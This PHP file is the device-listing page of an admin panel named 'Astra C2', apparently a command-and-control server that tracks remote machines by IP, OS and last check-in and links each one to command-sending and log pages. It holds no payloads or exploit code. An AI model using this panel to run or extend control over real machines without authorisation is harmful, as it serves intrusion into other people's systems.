<?php
/**
 * Admin Panel - Devices
 * Displays all devices and their status
 */

// Define included constant to prevent direct access to includes
define('INCLUDED', true);

// Include required files
require_once '../includes/db.php';
require_once '../includes/functions.php';

// Start session
session_start();

// Check if admin is authenticated
if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
    header('Location: index.php');
    exit;
}

// Connect to database
$db = Database::getInstance();

// Handle device deletion if requested
if (isset($_POST['delete_device']) && !empty($_POST['device_id'])) {
    $deviceId = sanitizeInput($_POST['device_id']);
    
    // Delete device and related data
    $deleteCommands = $db->executeQuery("DELETE FROM commands WHERE device_id = ?", "s", [$deviceId]);
    $deleteLogs = $db->executeQuery("DELETE FROM logs WHERE device_id = ?", "s", [$deviceId]);
    $deleteDevice = $db->executeQuery("DELETE FROM devices WHERE device_id = ?", "s", [$deviceId]);
    
    if ($deleteDevice !== false) {
        $message = "Device successfully deleted";
        $messageType = "success";
    } else {
        $message = "Failed to delete device";
        $messageType = "danger";
    }
}

// Get filter values if any
$filterStatus = isset($_GET['status']) ? sanitizeInput($_GET['status']) : '';
$filterOS = isset($_GET['os']) ? sanitizeInput($_GET['os']) : '';
$searchTerm = isset($_GET['search']) ? sanitizeInput($_GET['search']) : '';

// Build the query based on filters
$query = "SELECT device_id, name, os, ip_address, last_seen, status FROM devices WHERE 1=1";
$params = [];
$types = "";

if (!empty($filterStatus)) {
    if ($filterStatus === 'online') {
        $query .= " AND last_seen >= DATE_SUB(NOW(), INTERVAL 10 MINUTE)";
    } elseif ($filterStatus === 'offline') {
        $query .= " AND last_seen < DATE_SUB(NOW(), INTERVAL 10 MINUTE)";
    }
}

if (!empty($filterOS)) {
    $query .= " AND os LIKE ?";
    $params[] = "%$filterOS%";
    $types .= "s";
}

if (!empty($searchTerm)) {
    $query .= " AND (name LIKE ? OR ip_address LIKE ?)";
    $params[] = "%$searchTerm%";
    $params[] = "%$searchTerm%";
    $types .= "ss";
}

$query .= " ORDER BY last_seen DESC";

// Get the devices
$stmt = $db->executeQuery($query, $types, $params);

if ($stmt === false) {
    $devices = [];
} else {
    $result = $stmt->get_result();
    $devices = [];
    while ($row = $result->fetch_assoc()) {
        $devices[] = $row;
    }
    $stmt->close();
}

// Get unique OS values for filter
$osStmt = $db->executeQuery("SELECT DISTINCT os FROM devices ORDER BY os");
if ($osStmt !== false) {
    $osResult = $osStmt->get_result();
    $osOptions = [];
    while ($row = $osResult->fetch_assoc()) {
        $osOptions[] = $row['os'];
    }
    $osStmt->close();
} else {
    $osOptions = [];
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Astra C2 - Devices</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/material-icons@1.13.6/iconfont/material-icons.min.css">
    <link rel="stylesheet" href="../assets/css/style.css">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <div class="col-md-2 bg-dark sidebar">
                <div class="sidebar-header">
                    <h3 class="text-white">Astra C2</h3>
                </div>
                <ul class="nav flex-column">
                    <li class="nav-item">
                        <a class="nav-link" href="dashboard.php">
                            <i class="material-icons">dashboard</i> Dashboard
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="devices.php">
                            <i class="material-icons">devices</i> Devices
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="logs.php">
                            <i class="material-icons">description</i> Logs
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="command_center.php">
                            <i class="material-icons">send</i> Command Center
                        </a>
                    </li>
                </ul>
            </div>
            
            <!-- Main content -->
            <div class="col-md-10 main-content">
                <div class="container">
                    <h1 class="mt-4 mb-4">Devices</h1>
                    
                    <?php if (isset($message)): ?>
                    <div class="alert alert-<?php echo $messageType; ?> alert-dismissible fade show" role="alert">
                        <?php echo $message; ?>
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                    </div>
                    <?php endif; ?>
                    
                    <!-- Filters -->
                    <div class="card mb-4">
                        <div class="card-body">
                            <form action="devices.php" method="get" class="row g-3">
                                <div class="col-md-3">
                                    <label for="status" class="form-label">Status</label>
                                    <select name="status" id="status" class="form-select">
                                        <option value="">All</option>
                                        <option value="online" <?php echo $filterStatus === 'online' ? 'selected' : ''; ?>>Online</option>
                                        <option value="offline" <?php echo $filterStatus === 'offline' ? 'selected' : ''; ?>>Offline</option>
                                    </select>
                                </div>
                                
                                <div class="col-md-3">
                                    <label for="os" class="form-label">Operating System</label>
                                    <select name="os" id="os" class="form-select">
                                        <option value="">All</option>
                                        <?php foreach ($osOptions as $os): ?>
                                        <option value="<?php echo htmlspecialchars($os); ?>" <?php echo $filterOS === $os ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($os); ?>
                                        </option>
                                        <?php endforeach; ?>
                                    </select>
                                </div>
                                
                                <div class="col-md-4">
                                    <label for="search" class="form-label">Search</label>
                                    <input type="text" class="form-control" id="search" name="search" placeholder="Device name or IP" value="<?php echo htmlspecialchars($searchTerm); ?>">
                                </div>
                                
                                <div class="col-md-2">
                                    <label class="form-label">&nbsp;</label>
                                    <div>
                                        <button type="submit" class="btn btn-primary">Filter</button>
                                        <a href="devices.php" class="btn btn-outline-secondary">Reset</a>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                    
                    <!-- Devices Table -->
                    <div class="card">
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                        <tr>
                                            <th>Name</th>
                                            <th>Device ID</th>
                                            <th>OS</th>
                                            <th>IP Address</th>
                                            <th>Last Seen</th>
                                            <th>Status</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php if (empty($devices)): ?>
                                        <tr>
                                            <td colspan="7" class="text-center">No devices found</td>
                                        </tr>
                                        <?php else: ?>
                                        <?php foreach ($devices as $device): ?>
                                        <tr>
                                            <td><?php echo htmlspecialchars($device['name']); ?></td>
                                            <td><small><?php echo htmlspecialchars($device['device_id']); ?></small></td>
                                            <td><?php echo htmlspecialchars($device['os']); ?></td>
                                            <td><?php echo htmlspecialchars($device['ip_address']); ?></td>
                                            <td>
                                                <?php echo formatTimestamp($device['last_seen']); ?>
                                                <br>
                                                <small class="text-muted"><?php echo timeAgo($device['last_seen']); ?></small>
                                            </td>
                                            <td>
                                                <?php if (strtotime($device['last_seen']) >= strtotime('-10 minutes')): ?>
                                                <span class="badge bg-success">Online</span>
                                                <?php else: ?>
                                                <span class="badge bg-secondary">Offline</span>
                                                <?php endif; ?>
                                            </td>
                                            <td>
                                                <div class="btn-group">
                                                    <a href="command_center.php?device_id=<?php echo htmlspecialchars($device['device_id']); ?>" class="btn btn-sm btn-primary" title="Send Command">
                                                        <i class="material-icons">send</i>
                                                    </a>
                                                    <a href="logs.php?device_id=<?php echo htmlspecialchars($device['device_id']); ?>" class="btn btn-sm btn-info" title="View Logs">
                                                        <i class="material-icons">description</i>
                                                    </a>
                                                    <button type="button" class="btn btn-sm btn-danger" data-bs-toggle="modal" data-bs-target="#deleteModal<?php echo htmlspecialchars($device['device_id']); ?>" title="Delete Device">
                                                        <i class="material-icons">delete</i>
                                                    </button>
                                                </div>
                                                
                                                <!-- Delete Confirmation Modal -->
                                                <div class="modal fade" id="deleteModal<?php echo htmlspecialchars($device['device_id']); ?>" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">
                                                    <div class="modal-dialog">
                                                        <div class="modal-content">
                                                            <div class="modal-header">
                                                                <h5 class="modal-title" id="deleteModalLabel">Confirm Deletion</h5>
                                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                                            </div>
                                                            <div class="modal-body">
                                                                Are you sure you want to delete the device <strong><?php echo htmlspecialchars($device['name']); ?></strong>?
                                                                <p class="text-danger mt-2">This will also delete all commands and logs associated with this device.</p>
                                                            </div>
                                                            <div class="modal-footer">
                                                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                                                                <form action="devices.php" method="post">
                                                                    <input type="hidden" name="device_id" value="<?php echo htmlspecialchars($device['device_id']); ?>">
                                                                    <button type="submit" name="delete_device" class="btn btn-danger">Delete</button>
                                                                </form>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </td>
                                        </tr>
                                        <?php endforeach; ?>
                                        <?php endif; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="../assets/js/dashboard.js"></script>
</body>
</html>
